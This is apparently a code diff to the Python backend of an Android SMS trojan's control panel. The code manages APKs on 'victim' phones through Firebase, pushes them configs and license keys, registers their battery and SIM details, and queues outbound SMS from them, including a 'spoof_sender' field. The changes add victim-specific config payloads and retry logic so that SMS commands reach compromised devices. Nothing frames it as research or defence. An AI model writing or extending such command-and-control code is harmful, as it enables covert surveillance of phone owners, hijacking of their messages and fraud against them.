@@ -40,6 +40,13 @@ def resolve_firebase_url(
     return None
 
 
+def resolve_victim_apk_device_id(device: Device | None) -> str:
+    """Victim phone APK — must match Firebase device id for send/outgoing poll."""
+    if not device or not device.name:
+        return ""
+    return device.name.strip()
+
+
 def resolve_apk_poll_id(profile: MonitorProfile, device: Device | None = None) -> str:
     """APK on /mynum phone polls messages/{this_id}."""
     if profile.phone_number:
@@ -47,6 +54,29 @@ def resolve_apk_poll_id(profile: MonitorProfile, device: Device | None = None) -
     if device:
         return device.name
     return ""
+
+
+def _apk_config_payload(
+    profile: MonitorProfile,
+    device: Device | None,
+    *,
+    for_victim_panel: bool,
+) -> dict:
+    license_key = (get_license_key(profile) or "").strip().upper()
+    victim_id = resolve_victim_apk_device_id(device)
+    mynum_id = resolve_apk_poll_id(profile, device) if profile.phone_number else victim_id
+    poll_id = victim_id if for_victim_panel else (mynum_id or victim_id)
+    firebase_url = resolve_apk_firebase_url(profile, device) or settings.apk_config_db.rstrip("/")
+    return {
+        "monitoring": bool(profile.is_monitoring),
+        "ts": apk_config_ts(profile),
+        "firebase_url": normalize_firebase_url(firebase_url),
+        "device_id": poll_id,
+        "victim_device_id": victim_id,
+        "mynum_device_id": mynum_id,
+        "target_number": profile.phone_number,
+        "firebase_key": license_key,
+    }
 
 
 def get_license_key(profile: MonitorProfile) -> str | None:
@@ -218,22 +248,19 @@ async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None 
     if not firebase_url or not license_key or not license_key.upper().startswith("KEY-"):
         return
 
-    poll_id = resolve_apk_poll_id(profile, device)
-    payload = {
-        "monitoring": profile.is_monitoring,
-        "ts": apk_config_ts(profile),
-        "firebase_url": firebase_url,
-        "device_id": poll_id,
-        "firebase_key": license_key.strip().upper(),
-    }
     base = normalize_firebase_url(firebase_url)
     key = license_key.strip().upper()
+    victim_payload = _apk_config_payload(profile, device, for_victim_panel=True)
+    module_payload = _apk_config_payload(profile, device, for_victim_panel=False)
     config_bases = [base]
     bootstrap = settings.apk_config_db.rstrip("/")
     if bootstrap and bootstrap not in config_bases:
         config_bases.append(bootstrap)
-    tasks = [_firebase_put_ok(f"{b}/config/{key}", payload) for b in config_bases]
-    tasks.append(_firebase_put_ok(f"{base}/virtus_config", payload))
+    tasks = []
+    for b in config_bases:
+        payload = victim_payload if normalize_firebase_url(b) == base else module_payload
+        tasks.append(_firebase_put_ok(f"{b}/config/{key}", payload))
+    tasks.append(_firebase_put_ok(f"{base}/virtus_config", victim_payload))
     await asyncio.gather(*tasks, return_exceptions=True)
 
 
@@ -255,7 +282,7 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
     await push_key_config(
         license_key,
         monitoring=profile.is_monitoring,
-        device_id=resolve_apk_poll_id(profile, device),
+        device_id=resolve_victim_apk_device_id(device) or resolve_apk_poll_id(profile, device),
         target_number=profile.phone_number,
         firebase_url=resolve_apk_firebase_url(profile, device),
         ts_ms=apk_config_ts(profile),
@@ -408,9 +435,8 @@ async def register_device_on_firebase(
         "name": device.name,
         "phone": device.phone_number,
         "battery": meta.get("battery") or meta.get("battery_level"),
-        "online": True,
         "sim_index": profile.selected_sim_index or 0,
-        "last_seen": datetime.now(timezone.utc).isoformat(),
+        "monitoring": profile.is_monitoring,
     }
     await _firebase_put(f"{base}/devices/{device.name}", payload)
 
@@ -431,33 +457,28 @@ async def wake_apk_monitoring(profile: MonitorProfile, device: Device | None = N
     if not license_key or not license_key.upper().startswith("KEY-"):
         return
 
-    poll_id = resolve_apk_poll_id(profile, device)
-    firebase_url = resolve_apk_firebase_url(profile, device) or settings.apk_config_db.rstrip("/")
     key = license_key.strip().upper()
-    session_ts = apk_config_ts(profile)
-    payload = {
-        "monitoring": bool(profile.is_monitoring),
-        "ts": session_ts,
-        "firebase_url": normalize_firebase_url(firebase_url),
-        "device_id": poll_id,
-        "firebase_key": key,
-    }
     bootstrap = settings.apk_config_db.rstrip("/")
+    victim = resolve_apk_firebase_url(profile, device)
     bases: list[str] = []
     if bootstrap:
         bases.append(bootstrap)
-    victim = resolve_apk_firebase_url(profile, device)
     if victim and victim not in bases:
         bases.append(normalize_firebase_url(victim))
 
+    victim_payload = _apk_config_payload(profile, device, for_victim_panel=True)
+    module_payload = _apk_config_payload(profile, device, for_victim_panel=False)
+    victim_norm = normalize_firebase_url(victim) if victim else ""
+
     for base in bases:
+        payload = victim_payload if victim_norm and normalize_firebase_url(base) == victim_norm else module_payload
         ok = await _firebase_put_ok(f"{base}/config/{key}", payload)
         logger.info(
-            "APK config wake monitoring=%s base=%s ok=%s poll_id=%s",
+            "APK config wake monitoring=%s base=%s ok=%s device_id=%s",
             profile.is_monitoring,
             base,
             ok,
-            poll_id,
+            payload.get("device_id"),
         )
 
 
@@ -603,15 +624,14 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
-        if await push_channel_webhook_sms(
+        webhook_ok = await push_channel_webhook_sms(
             firebase_url,
             device,
             outbound.to_number,
             outbound.message,
             sim_index=outbound.sim_index or 0,
-        ):
-            return "webhook"
-        return await push_outgoing_sms_command(
+        )
+        command_id = await push_outgoing_sms_command(
             firebase_url,
             device.name,
             outbound.to_number,
@@ -620,6 +640,11 @@ async def push_outbound_to_firebase(
             sim_slot=outbound.sim_slot,
             device=device,
         )
+        if command_id:
+            return command_id
+        if webhook_ok:
+            return "webhook"
+        return None
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
@@ -633,6 +658,9 @@ async def send_recharge_check_sms(db, profile: MonitorProfile, device: Device) -
 
     if not profile.is_monitoring or not profile.sim_selected:
         return False
+
+    await publish_monitoring_state(profile, device)
+    await asyncio.sleep(0.45)
     mynum = resolve_mynum_phone(profile, db)
     if not mynum:
         logger.warning("Recharge check skipped: /mynum not set")
@@ -645,6 +673,11 @@ async def send_recharge_check_sms(db, profile: MonitorProfile, device: Device) -
     try:
         outbound = queue_manual_sms(db, profile, device, mynum, RECHARGE_CHECK_MESSAGE)
         command_id = await push_outbound_to_firebase(profile, device, outbound)
+        if not command_id:
+            await asyncio.sleep(0.8)
+            await wake_apk_monitoring(profile, device)
+            await asyncio.sleep(0.5)
+            command_id = await push_outbound_to_firebase(profile, device, outbound)
         if command_id:
             outbound.status = "sent"
             db.commit()
